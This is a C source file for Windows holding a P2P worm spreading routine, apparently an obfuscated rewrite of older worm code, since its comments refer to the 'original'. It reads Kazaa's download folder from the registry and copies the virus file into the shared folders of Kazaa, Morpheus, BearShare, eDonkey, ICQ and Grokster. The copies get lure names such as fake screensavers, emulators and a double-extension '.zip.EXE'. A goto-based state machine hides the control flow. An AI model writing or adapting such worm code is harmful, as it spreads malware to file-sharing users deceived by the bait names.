#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <string.h>

void _P2PCopy(void)
{
    volatile int dummy_state = 1;
    int i;
    DWORD size;

dummy_dispatcher:
    if (dummy_state == 1) goto block1;
    if (dummy_state == 2) goto block2;
    if (dummy_state == 3) goto block3;
    if (dummy_state == 4) goto block4;
    if (dummy_state == 5) goto block5;
    if (dummy_state == 6) goto block6;
    if (dummy_state == 0) goto end;

block1:
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Kazaa\\Transfer", 0, KEY_READ, &_hKey);
    dummy_state = 2;
    goto dummy_dispatcher;

block2:
    size = sizeof(_Kazaa);   // original used sizeof(Kazaa)
    RegQueryValueExA(_hKey, "DlDir0", NULL, NULL, (LPBYTE)_Kazaa, &size);
    dummy_state = 3;
    goto dummy_dispatcher;

block3:
    RegCloseKey(_hKey);
    dummy_state = 4;
    goto dummy_dispatcher;

block4:
    // Original: if (Kazaa[0]>64 && Kazaa[0]<123)
    if (_Kazaa[0] > 64 && _Kazaa[0] < 123) {
        dummy_state = 5;
    } else {
        dummy_state = 6;
    }
    goto dummy_dispatcher;

block5:
    // Copy Kazaa to KazaaFull
    strcpy(_KazaaFull, _Kazaa);
    // Append the filename
    strcat(_KazaaFull, "\\Kira Kerner SCREENSAVER.Scr");

    CopyFileA(_VirusPath, _KazaaFull, FALSE);
    CopyFileA(_VirusPath, "\\Program Files\\Morpheus\\My Shared Folder\\HOT SEXY SCREENSAVER.Scr", FALSE);
    CopyFileA(_VirusPath, "\\Program Files\\BearShare\\Shared\\XBOX EMU REALWORKING.EXE", FALSE);
    CopyFileA(_VirusPath, "\\Program Files\\EDonkey2000\\Incoming\\PS2 EMU REALWORKING.EXE", FALSE);
    CopyFileA(_VirusPath, "\\My Downloads\\NUDIE SCREENSAVER.Scr", FALSE);
    CopyFileA(_VirusPath, "\\Program Files\\ICQ\\Shared Files\\GAMECUBE EMU REALWORKING.EXE", FALSE);
    CopyFileA(_VirusPath, "\\Program Files\\Grokster\\My Grokster\\KOF2K2.zip.EXE", FALSE);
    dummy_state = 6;
    goto dummy_dispatcher;

block6:
    dummy_state = 0;
    goto dummy_dispatcher;

end:
    return;
}
#pragma optimize("", on)
